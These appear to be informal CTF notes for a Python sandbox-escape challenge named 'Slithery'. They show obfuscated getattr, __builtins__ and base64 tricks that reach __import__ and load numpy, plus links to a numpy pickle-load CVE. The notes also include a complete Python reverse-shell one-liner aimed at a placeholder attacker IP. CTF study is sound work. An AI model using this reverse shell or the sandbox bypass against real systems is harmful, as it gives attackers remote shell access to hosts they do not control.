# Slithery

```python
504 temple@occam:~/tmp/ctf/slithery
$> python3
Python 3.8.2 (default, Jul 16 2020, 14:00:26)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> uOaoBPLLRN = open("sandbox.py", "r")
>>> uDwjTIgNRU = int(((54 * 8) / 16) * (1/3) - 8)
>>> print(uDwjTIgNRU)
1
>>> ORppRjAVZL = uOaoBPLLRN.readlines()[uDwjTIgNRU].strip().split(" ")
>>> print(ORppRjAVZL)
['from', 'base64', 'import', 'b64decode']
>>> AAnBLJqtRv = ORppRjAVZL[uDwjTIgNRU]
>>> print(AAnBLJqtRv)
base64
>>> bAfGdqzzpg = ORppRjAVZL[-uDwjTIgNRU]
>>> print(bAfGdqzzpg)
b64decode
>>> uOaoBPLLRN.close()
>>> HrjYMvtxwA = getattr(__import__(AAnBLJqtRv), bAfGdqzzpg)
>>> print(HrjYMvtxwA)
<function b64decode at 0x7f0a0fb6e550>
>>> RMbPOQHCzt = __builtins__.__dict__[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')](HrjYMvtxwA(b'bnVtcHk=').decode('utf-8'))
>>> print(RMbPOQHCzt)
<module 'numpy' from '/home/temple/.local/lib/python3.8/site-packages/numpy/__init__.py'>
```

-   `getattr`- Gets a reference to the `base64`.`b64decode` function.

    -   https://www.programiz.com/python-programming/methods/built-in/getattr

-   `__builtins__`

        * https://docs.python.org/3/library/builtins.html

        ```python
        >>> __builtins__.__dict__[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')]
        <built-in function __import__>

        >>> HrjYMvtxwA(b'bnVtcHk=').decode('utf-8')
        'numpy
        ```

    > Getting the 'import' built-in function and using it to load 'numpy'

    -   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    echo 'print("Hello")' | base64
    echo cHJpbnQoIkhlbGxvIikK | base64 -d

    "cHJpbnQoIkhlbGxvIikK".decode('utf-8')
    __builtins__.__dict__[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')](HrjYMvtxwA(b'bnVtcHk=').decode('utf-8'))

---

* [Numpy CVE](https://www.cvedetails.com/cve/CVE-2019-6446/)
* [CVE details](https://www.cvedetails.com/vulnerability-list/vendor_id-16835/product_id-39445/version_id-271909/Numpy-Numpy-1.16.0.html)

```bash

RMbPOQHCzt.load()
```

* [pickle](https://docs.python.org/3/library/pickle.html)